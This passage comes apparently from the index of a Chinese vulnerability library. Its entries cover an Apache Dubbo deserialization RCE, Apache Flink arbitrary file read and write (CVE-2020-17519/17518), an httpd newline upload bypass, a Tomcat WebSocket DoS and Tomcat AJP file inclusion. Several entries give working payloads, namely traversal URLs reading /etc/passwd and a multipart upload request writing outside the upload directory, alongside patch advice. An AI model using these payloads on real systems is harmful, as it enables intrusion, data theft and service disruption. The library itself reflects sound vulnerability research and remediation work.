client.send_request_and_return_response(\n    service_name='org.apache.dubbo.spring.boot.demo.consumer.DemoService',\n    method_name='rce',\n    args=[toStringBean])\n</code></pre> <p>\u672c\u6b21\u6f0f\u6d1e\u5229\u7528\u7684\u662f <code>com.rometools.rome.feed.impl.ToStringBean#toString</code> \u65b9\u6cd5\uff0c\u91cd\u5199\u4e86 <code>toString</code>\uff0c\u8be5\u65b9\u6cd5\u5c06\u4f1a\u8c03\u7528\u6784\u9020\u5bf9\u8c61\u7684\u6240\u6709 <code>getter</code> \u65b9\u6cd5</p> <p></p> <p>\u4ece\u4e0a\u9762 <code>PoC</code> \u53ef\u4ee5\u770b\u5230\uff0c\u6267\u884c <code>Dubbo</code> \u8c03\u7528\u65f6\uff0c\u4f20\u5165\u7684\u662f <code>ToStringBean</code> \u7c7b\u578b\u53c2\u6570\uff0c\u6784\u9020\u7684\u5bf9\u8c61\u662f<code>com.sun.rowset.JdbcRowSetImpl</code>\uff0c\u5e76\u4e14 <code>datasource</code> \u5c5e\u6027\u8bbe\u7f6e\u7684\u662f <code>JNDI</code> \u66b4\u9732\u7684 <code>url</code>\uff0c\u5728\u8c03\u7528 <code>JdbcRowSetImpl</code> \u7684 <code>getDatabaseMetaData</code> \u65b9\u6cd5\u65f6\uff0c\u6267\u884c <code>connect</code> \u64cd\u4f5c\uff0c\u4e0b\u8f7d\u8fdc\u7aef\u4ee3\u7801\uff0c\u5728 <code>Service Provider</code> \u6267\u884c\uff0c\u9020\u6210\u653b\u51fb\u3002</p> <p></p> <p>\u8c03\u8d77 <code>toString</code> \u65b9\u6cd5\u7684\u5730\u65b9\u662f\u5728 <code>Dubbo Provider</code> \u63a5\u6536 <code>DecodeHandler#received:44</code> \u8bf7\u6c42\uff0c\u5728 <code>DecodeableRpcInvocation#decode</code> \u53cd\u5e8f\u5217\u5316\u53c2\u6570\u7684\u5730\u65b9\uff1a</p> <p></p> <p><code>dubbo</code> \u9ed8\u8ba4\u4f7f\u7528\u7684\u662f <code>hession2</code> \u5e8f\u5217\u5316\uff0c\u89e3\u6790\u53c2\u6570\u6267\u884c\u7684\u662f\u8fd9\u4e2a\u65b9\u6cd5</p> <p>org.apache.dubbo.common.serialize.hessian2.Hessian2ObjectInput#readUTF</p> <p>\u5728 <code>hession</code> \u53cd\u5e8f\u5217\u5316\u8fc7\u7a0b\u4e2d\uff0c\u901a\u8fc7\u4e0b\u9762\u4ee3\u7801\u6bb5\u6267\u884c\u5230\u4e86 <code>ToStringBean#toString</code></p> <p></p> <p>\u81f3\u6b64\uff0c\u6ce8\u5165\u653b\u51fb\u7684\u6d41\u7a0b\u5230\u8fd9\u91cc\u6267\u884c\u5b8c\u6210\u3002\u53ef\u4ee5\u53c2\u8003\u5de6\u4e0b\u4fa7\u7684\u5806\u6808\u94fe\u8def\uff1a</p> <pre><code>connect:624, JdbcRowSetImpl (com.sun.rowset)\ngetDatabaseMetaData:4004, JdbcRowSetImpl (com.sun.rowset)\ninvoke0:-1, NativeMethodAccessorImpl (sun.reflect)\ninvoke:62, NativeMethodAccessorImpl (sun.reflect)\ninvoke:43, DelegatingMethodAccessorImpl (sun.reflect)\ninvoke:498, Method (java.lang.reflect)\ntoString:158, ToStringBean (com.rometools.rome.feed.impl)\ntoString:129, ToStringBean (com.rometools.rome.feed.impl)\nbeanHashCode:198, EqualsBean (com.rometools.rome.feed.impl)\nhashCode:180, EqualsBean (com.rometools.rome.feed.impl)\nhash:339, HashMap (java.util)\nput:612, HashMap (java.util)\ndoReadMap:145, MapDeserializer (com.alibaba.com.caucho.hessian.io)\nreadMap:126, MapDeserializer (com.alibaba.com.caucho.hessian.io)\nreadObject:2703, Hessian2Input (com.alibaba.com.caucho.hessian.io)\nreadObject:2278, Hessian2Input (com.alibaba.com.caucho.hessian.io)\nreadObject:2080, Hessian2Input (com.alibaba.com.caucho.hessian.io)\nreadObject:2074, Hessian2Input (com.alibaba.com.caucho.hessian.io)\nreadObject:92, Hessian2ObjectInput (org.apache.dubbo.common.serialize.hessian2)\ndecode:139, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo)\ndecode:79, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo)\ndecode:57, DecodeHandler (org.apache.dubbo.remoting.transport)\nreceived:44, DecodeHandler (org.apache.dubbo.remoting.transport)\nrun:57, ChannelEventRunnable (org.apache.dubbo.remoting.transport.dispatcher)\n</code></pre> <ul> <li>\u5408\u5e76\u793e\u533a <code>aquariuspj</code> \u7528\u6237\u7ed9\u51fa\u7684\u5bf9 <code>DecodeableRpcInvocation</code> \u589e\u52a0\u5165\u53c2\u7c7b\u578b\u6821\u9a8c</li> </ul> <p>\u4fee\u590d\u5206\u652f #6374</p> <ul> <li>\u6f0f\u6d1e\u53d1\u73b0\u8005 <code>rui0</code> \u5efa\u8bae\u5220\u9664 <code>RpcInvocation</code> \u7c7b\u7684 <code>toString</code> \u65b9\u6cd5\u4e2d\u8f93\u51fa\u7684 <code>arguments</code> \u53c2\u6570,\u9632\u8303\u540e\u53cd\u5e8f\u5217\u5316\u653b\u51fb\u3002\u540c\u65f6\u5bf9 <code>Hessian</code> \u8fdb\u884c\u9ed1\u767d\u540d\u5355\u52a0\u56fa\u6765\u9632\u8303 <code>Hessian</code> \u53cd\u5e8f\u5217\u5316\u653b\u51fb\u3002    \u8bc4\u8bba\u5efa\u8bae</li> </ul> <p>\u8fd8\u6709\u963f\u91cc\u4e91\u5b98\u65b9\u7684\u5b89\u5168\u5efa\u8bae</p> <p>\u76ee\u524d\u5b98\u65b9\u8fd8\u672a\u53d1\u5e03\u9488\u5bf9\u6b64\u6f0f\u6d1e\u7ed5\u8fc7\u624b\u6cd5\u7684\u8865\u4e01\uff0c\u5728\u963f\u91cc\u4e91\u63d0\u4f9b\u4e00\u4e2a\u6708\u7684\u9ed8\u8ba4\u9632\u5fa1\u671f\u9650\u5185\uff0c\u5efa\u8bae\u5ba2\u6237\u53c2\u8003\u4ee5\u4e0b\u65b9\u6cd5\u8fdb\u884c\u7f13\u89e3\uff0c\u5e76\u5173\u6ce8\u5b98\u65b9\u8865\u4e01\u52a8\u6001\uff0c\u53ca\u65f6\u8fdb\u884c\u66f4\u65b0\uff1a</p> <ul> <li>1\u3001\u5347\u7ea7 2.7.7 \u7248\u672c\uff0c\u5e76\u6839\u636ehttps://github.com/apache/dubbo/pull/6374/commits/8fcdca112744d2cb98b349225a4aab365af563de \u7684\u65b9\u6cd5\u8fdb\u884c\u53c2\u6570\u6821\u9a8c</li> <li>\u7981\u6b62\u5c06 <code>Dubbo</code> \u670d\u52a1\u7aef\u7aef\u53e3\u5f00\u653e\u7ed9\u516c\u7f51\uff0c\u6216\u4ec5\u4ec5\u53ea\u5bf9\u80fd\u591f\u8fde\u63a5\u81f3 <code>Dubbo</code> \u670d\u52a1\u7aef\u7684\u53ef\u4fe1\u6d88\u8d39\u7aefIP\u5f00\u653e</li> <li><code>Dubbo</code> \u534f\u8bae\u9ed8\u8ba4\u91c7\u7528 <code>Hessian</code> \u4f5c\u4e3a\u5e8f\u5217\u5316\u53cd\u5e8f\u5217\u5316\u65b9\u5f0f\uff0c\u8be5\u53cd\u5e8f\u5217\u5316\u65b9\u5f0f\u5b58\u5728\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u3002\u5728\u4e0d\u5f71\u54cd\u4e1a\u52a1\u7684\u60c5\u51b5\u4e0b\uff0c\u5efa\u8bae\u66f4\u6362\u534f\u8bae\u4ee5\u53ca\u53cd\u5e8f\u5217\u5316\u65b9\u5f0f\u3002\u5177\u4f53\u66f4\u6362\u65b9\u6cd5\u53ef\u53c2\u8003\uff1ahttp://dubbo.apache.org/zh-cn/docs/user/references/xml/dubbo-protocol.html</li> </ul> <p>\u9700\u8981\u5f15\u5165 <code>rome</code> \u7c7b\u578b\u7684 <code>jar</code> \u5305\uff0c\u5305\u542b\u7279\u6b8a\u7684\u6784\u9020\u65b9\u6cd5\u548c <code>toString</code> \u65b9\u6cd5\uff08\u6216\u8bb8\u8fd8\u6709\u5176\u5b83\u653b\u51fb\u70b9\uff09</p> <p>\u793e\u533a\u8ba8\u8bba\u548c <code>commit</code> \u7684\u5185\u5bb9\uff0c\u589e\u52a0\u4e86\u524d\u7f6e\u6821\u9a8c\uff0c\u5728\u53cd\u5e8f\u5217\u5316\u4e4b\u524d\u5224\u65ad\u670d\u52a1\u6216\u65b9\u6cd5\u662f\u5426\u6709\u6548\uff0c\u975e <code>$invoke</code> \u6216 <code>$echo</code> \u65b9\u6cd5\u5c06\u4f1a\u629b\u51fa\u9519\u8bef\uff0c\u4e0d\u8fdb\u884c\u53c2\u6570\u7684\u53cd\u5e8f\u5217\u5316\uff0c\u589e\u52a0\u4e86\u4e00\u70b9\u653b\u51fb\u96be\u5ea6\u3002\u4f46\u7531\u4e8e\u65b9\u6cd5\u540d <code>methodName</code> \u53ef\u4ee5\u7528\u6237\u81ea\u5b9a\u4e49\uff0c\u6240\u4ee5\u4fee\u6539\u65b9\u6cd5\u540d\u8fd8\u662f\u6709\u53ef\u80fd\u8df3\u8fc7\u6821\u9a8c\uff0c\u89e6\u53d1\u6f0f\u6d1e</p> <p></p> <p>\u4e1a\u52a1\u65b9\u4f7f\u7528 <code>rome</code>  \u4f9d\u8d56\u7684\u5f88\u5c11\uff0c\u6784\u9020\u8fd9\u79cd\u7c7b\u578b\u7684\u653b\u51fb\uff0c\u7531\u4e8e\u6ca1\u6709\u8fd9\u4e2a\u7c7b\uff0c\u5728 <code>provider</code> \u53cd\u5e8f\u5217\u5316\u65f6\u4f1a\u63d0\u524d\u62a5 <code>classNotFoundException</code>\uff0c\u6ca1\u6709\u6267\u884c\u5230 <code>readObject</code> \u65b9\u6cd5\uff0c\u4ece\u800c\u65e0\u6cd5\u653b\u51fb\u3002</p> <p>\u7efc\u4e0a\u6240\u8ff0\uff0c\u8003\u8651\u5230\u4fee\u590d\u96be\u5ea6\u548c\u5f71\u54cd\u8303\u56f4\uff0c\u6700\u540e\u5bf9 dubbo \u4fee\u6539\u65b9\u6848\u5982\u4e0b\uff1a</p> <ul> <li>1\u3001\u5408\u5e76\u793e\u533a\u9488\u5bf9\u6539\u6f0f\u6d1e\u7684\u4fee\u590d\u5206\u652f #6374</li> <li>2\u3001\u5c06 <code>RpcInvocation#toString</code> \u65b9\u6cd5\u4e2d <code>Arrays.toString(arguments)</code> \u79fb\u9664\uff0c\u907f\u514d\u5bf9\u8f93\u5165\u53c2\u6570\u8fdb\u884c\u53cd\u5e8f\u5217\u5316</li> </ul> <p>\u9694\u884c\u5982\u9694\u5c71\uff0c\u4e00\u5c71\u8fd8\u6709\u4e00\u5c71\u9ad8\uff0c\u4fee\u590d\u6f0f\u6d1e\u771f\u56f0\u96be\u3002\u611f\u6168\u6f0f\u6d1e\u53d1\u73b0\u8005\u4eec\uff0c\u591a\u4e8f\u8fd9\u4e9b\u767d\u5e3d\u5b50\u7684\u4ed4\u7ec6\uff0c\u63ed\u9732\u4e86\u8fd9\u4e48\u591a\u53ef\u653b\u51fb\u70b9\uff0c\u5c06\u6f0f\u6d1e\u4fe1\u606f\u63d0\u4ea4\u5230\u5b89\u5168\u4e2d\u5fc3\uff0c\u8ba9\u4f7f\u7528\u65b9\u4e86\u89e3\u5230\u6f0f\u6d1e\u8be6\u60c5\u3002</p> <p>\u8fd8\u6709 <code>Dubbo</code> \u8fd9\u4e2a\u4e2d\u95f4\u4ef6\u7684\u793e\u533a\u6d3b\u8dc3\u5ea6\u5f88\u9ad8\uff0c\u51fa\u73b0\u95ee\u9898\u540e\uff0c\u5927\u5bb6\u8ba8\u8bba\u7684\u70ed\u60c5\u9ad8\u6da8\uff0c\u79ef\u6781\u53bb\u4fee\u590d\u6f0f\u6d1e\uff0c\u793e\u533a\u6d3b\u8dc3\u5ea6\u9ad8\uff0c\u4ee3\u7801\u66f4\u65b0\u5feb\uff0c\u652f\u6301\u7684\u529f\u80fd\u8d8a\u6765\u8d8a\u591a\uff0c\u4f7f\u7528\u8d77\u6765\u4e5f\u66f4\u653e\u5fc3\u3002</p> <p>\u901a\u8fc7\u8fd9\u6b21\u5206\u6790\uff0c\u4e86\u89e3\u5230\u633a\u591a\u57fa\u7840\u7684\u5b89\u5168\u77e5\u8bc6\uff0c\u611f\u89c9\u968f\u7740\u5f00\u6e90\u4ee3\u7801\u88ab\u7814\u7a76\u66f4\u900f\u5f7b\uff0c\u53ef\u4f9b\u653b\u51fb\u7684\u70b9\u4e5f\u8d8a\u6765\u8d8a\u591a\uff0c\u5728\u4ee3\u7801\u8bbe\u8ba1\u548c\u7f16\u5199\u65f6\uff0c\u4e5f\u5f97\u6ce8\u610f\u4e00\u4e0b\u5b89\u5168\u4fe1\u606f\uff0c\u907f\u514d\u88ab\u653b\u51fb\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/Apache%20Flink%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%28CVE-2020-17519%20%29/","title":"Apache Flink \u4efb\u610f\u6587\u4ef6\u8bfb\u53d6(CVE 2020 17519 )","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/Apache%20Flink%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%28CVE-2020-17519%20%29/#_1","title":"\u7b80\u4ecb","text":"<p>Apache Flink\u662f\u4e00\u4e2a\u5f00\u6e90\u6d41\u5904\u7406\u6846\u67b6\uff0c\u5177\u6709\u5f3a\u5927\u7684\u6d41\u5904\u7406\u548c\u6279\u5904\u7406\u529f\u80fd\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/Apache%20Flink%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%28CVE-2020-17519%20%29/#_2","title":"\u5f71\u54cd\u7248\u672c","text":"<p>1.11.0</p> <p>1.11.1</p> <p>1.11.2</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/Apache%20Flink%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%28CVE-2020-17519%20%29/#_3","title":"\u6f0f\u6d1e\u5229\u7528","text":"<p>POC:</p> <pre><code>http://127.0.0.1/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd\n</code></pre> <p></p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/Apache%20Flink%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%28CVE-2020-17519%20%29/#_4","title":"\u4fee\u590d\u5efa\u8bae","text":"<p>\u6240\u6709\u7528\u6237\u5347\u7ea7\u6700\u65b0\u7248</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/Apache%20Flink%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E%28CVE-2020-17518%29/","title":"Apache Flink\u4efb\u610f\u6587\u4ef6\u5199\u5165\u6f0f\u6d1e(CVE 2020 17518)","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/Apache%20Flink%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E%28CVE-2020-17518%29/#_1","title":"\u7b80\u4ecb","text":"<p>Apache Flink\u662f\u4e00\u4e2a\u5f00\u6e90\u6d41\u5904\u7406\u6846\u67b6\uff0c\u5177\u6709\u5f3a\u5927\u7684\u6d41\u5904\u7406\u548c\u6279\u5904\u7406\u529f\u80fd</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/Apache%20Flink%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E%28CVE-2020-17518%29/#_2","title":"\u5f71\u54cd\u7248\u672c","text":"<p>1.11.0</p> <p>1.11.1</p> <p>1.11.2</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/Apache%20Flink%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E%28CVE-2020-17518%29/#_3","title":"\u6f0f\u6d1e\u5229\u7528","text":"<p>\u5199\u5165EXP\uff1a</p> <pre><code>POST /jars/upload HTTP/1.1\nHost: 127.0.0.1:8081\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36\nConnection: close\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryoZ8meKnrrso89R6Y\nContent-Length: 185\n\n------WebKitFormBoundaryoZ8meKnrrso89R6Y\nContent-Disposition: form-data; name=\"jarfile\"; filename=\"../../../../../../tmp/success\"\n\nzzzzzzz\n------WebKitFormBoundaryoZ8meKnrrso89R6Y--\n</code></pre> <p></p> <p>\u9a8c\u8bc1\u5199\u5165:</p> <pre><code>http://127.0.0.1/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fsuccess\n</code></pre> <p>\u6210\u529f\u5199\u5165\uff1a</p> <p></p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/Apache%20Flink%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E%28CVE-2020-17518%29/#_4","title":"\u4fee\u590d\u5efa\u8bae","text":"<p>\u6240\u6709\u7528\u6237\u5347\u7ea7\u6700\u65b0\u7248</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/Apache%20Httpd%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/","title":"Apache Httpd\u6362\u884c\u89e3\u6790\u6f0f\u6d1e","text":"","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/Apache%20Httpd%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/#_1","title":"\u6f0f\u6d1e\u5f71\u54cd","text":"<p>Apache httpd2.4.0~2.4.29</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/Apache%20Httpd%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/#_2","title":"\u6f0f\u6d1e\u9a8c\u8bc1","text":"<p>1.a.php\u6587\u4ef6 \u5185\u5bb9\uff1a</p> <p>```</p> <p>```</p> <p>2.\u4e0a\u4f20a.php\u5e76\u6293\u5305 </p> <p>3.\u4fee\u6539a.php HEX\u7684\u540e\u9762\u52a0\u4e0a0a\u540e\u653e\u5305</p> <p></p> <p>4.\u6587\u4ef6\u4e0a\u4f20\u6210\u529f</p> <p></p> <p>5.\u8bbf\u95eea.php,\u540e\u7f00\u52a0\u4e0a%0A</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/Apache%20Tomcat%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-13935%EF%BC%89/","title":"Apache Tomcat\u62d2\u7edd\u670d\u52a1\u6f0f\u6d1e\uff08CVE 2020 13935\uff09","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/Apache%20Tomcat%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-13935%EF%BC%89/#_1","title":"\u6f0f\u6d1e\u8be6\u60c5","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/Apache%20Tomcat%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-13935%EF%BC%89/#_2","title":"\u53d7\u5f71\u54cd\u7248\u672c","text":"<p>Apache Tomcat 10.0.0-M1~10.0.0-M6 </p> <p>Apache Tomcat 9.0.0.M1~9.0.36 </p> <p>Apache Tomcat 8.5.0~8.5.56 </p> <p>Apache Tomcat 7.0.27~7.0.104</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/Apache%20Tomcat%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-13935%EF%BC%89/#_3","title":"\u6f0f\u6d1e\u8be6\u60c5","text":"<p>\u6839\u636ehttps://github.com/RedTeamPentesting/CVE-2020-13935</p> <p>\u8fd0\u884c\u547d\u4ee4</p> <pre><code>go run main.go ws://localhost/examples/websocket/echoProgrammatic\n</code></pre> <p>\u53ef\u4ee5\u770b\u5230cpu\u7acb\u5373\u88ab\u5360\u6ee1</p> <p></p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/Apache%20Tomcat%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-13935%EF%BC%89/#_4","title":"\u6f0f\u6d1e\u4fee\u590d\u65b9\u6848\uff1a","text":"<p>\u5347\u7ea7\u5230Apache Tomcat 10.0.0-M7+ </p> <p>\u5347\u7ea7\u5230Apache Tomcat 9.0.37+ </p> <p>\u5347\u7ea7\u5230Apache Tomcat 8.5.57</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/Apache-Tomcat-Ajp%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABCVE-2020-1938/","title":"Apache-Tomcat-Ajp\u6587\u4ef6\u5305\u542bCVE-2020-1938","text":"","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/Apache-Tomcat-Ajp%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABCVE-2020-1938/#_1","title":"\u5f71\u54cd\u8303\u56f4","text":"<p>Apache Tomcat 6 Apache Tomcat 7 &lt; 7.0.100 Apache Tomcat 8 &lt; 8.5.51 Apache Tomcat 9 &lt; 9.0.31</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/Apache-Tomcat-Ajp%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABCVE-2020-1938/#_2","title":"\u6f0f\u6d1e\u7b80\u4ecb","text":"<p>Apache Tomcat\u670d\u52a1\u5668\u5b58\u5728\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u53ef\u5229\u7528\u8be5\u6f0f\u6d1e\u8bfb\u53d6\u6216\u5305\u542b Tomcat \u4e0a\u6240\u6709 webapp \u76ee\u5f55\u4e0b\u7684\u4efb\u610f\u6587\u4ef6\uff0c\u5982\uff1awebapp \u914d\u7f6e\u6587\u4ef6\u6216\u6e90\u4ee3\u7801\u7b49\u3002</p> <p>\u7531\u4e8eTomcat\u9ed8\u8ba4\u5f00\u542f\u7684AJP\u670d\u52a1\uff088009\u7aef\u53e3\uff09\u5b58\u5728\u4e00\u5904\u6587\u4ef6\u5305\u542b\u7f3a\u9677\uff0c\u653b\u51fb\u8005\u53ef\u6784\u9020\u6076\u610f\u7684\u8bf7\u6c42\u5305\u8fdb\u884c\u6587\u4ef6\u5305\u542b\u64cd\u4f5c\uff0c\u8fdb\u800c\u8bfb\u53d6\u53d7\u5f71\u54cdTomcat\u670d\u52a1\u5668\u4e0a\u7684Web\u76ee\u5f55\u6587\u4ef6\u3002</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/Apache-Tomcat-Ajp%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABCVE-2020-1938/#_3","title":"\u590d\u73b0\u5229\u7528","text":"<p>\u642d\u5efa\u73af\u5883 \u514b\u9686\u5b9e\u9a8c\u73af\u5883</p> <pre><code>git clone https://github.com/laolisafe/CVE-2020-1938\n</code></pre> <p>\u89e3\u538bApache</p> <pre><code>unzip apache-tomcat-8.5.32.zip\n</code></pre> <p>\u5728Apache\u7684bin\u76ee\u5f55\u4e0b\uff0c\u6dfb\u52a0\u6267\u884c\u6743\u9650\uff0c\u6211\u8fd9\u91cc\u7ed9\u5168\u90e8\u6743\u9650</p> <pre><code>chmod -R +x bin/\n</code></pre> <p>\u542f\u52a8apache</p> <pre><code>sh startup.sh\n</code></pre> <p>\u67e5\u770b\u7aef\u53e3\uff0c8009\u7aef\u53e3\u662f\u5f00\u542f\u7684 </p> <p>\u5229\u7528\u6f0f\u6d1e poc\u4e0b\u8f7d\u5730\u5740\uff1ahttps://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi \u6ce8\u610fpoc\u4e3apy2\u73af\u5883</p> <pre><code>python ./ CNVD-2020-10487-Tomcat-Ajp-lfi.py \u672c\u5730ip \u2013p 8009 \u2013f WEB-INF/web.xml\n</code></pre> <p></p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/Apache-Tomcat-Ajp%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABCVE-2020-1938/#_4","title":"\u6f0f\u6d1e\u4fee\u590d\u5efa\u8bae","text":"<p>1.\u4e34\u65f6\u7981\u7528AJP\u534f\u8bae\u7aef\u53e3\uff0c\u5728conf/server.xml\u914d\u7f6e\u6587\u4ef6\u4e2d\u6ce8\u91ca\u6389</p> <p>2\u3001\u914d\u7f6eajp\u914d\u7f6e\u4e2d\u7684secretRequired\u8ddfsecret\u5c5e\u6027\u6765\u9650\u5236\u8ba4\u8bc1</p> <p>3\u3001\u5b98\u65b9\u4e0b\u8f7d\u6700\u65b0\u7248\u4e0b\u8f7d\u5730\u5740\uff1a https://tomcat.apache.org/download-70.cgi https://tomcat.apache.org/download-80.cgi 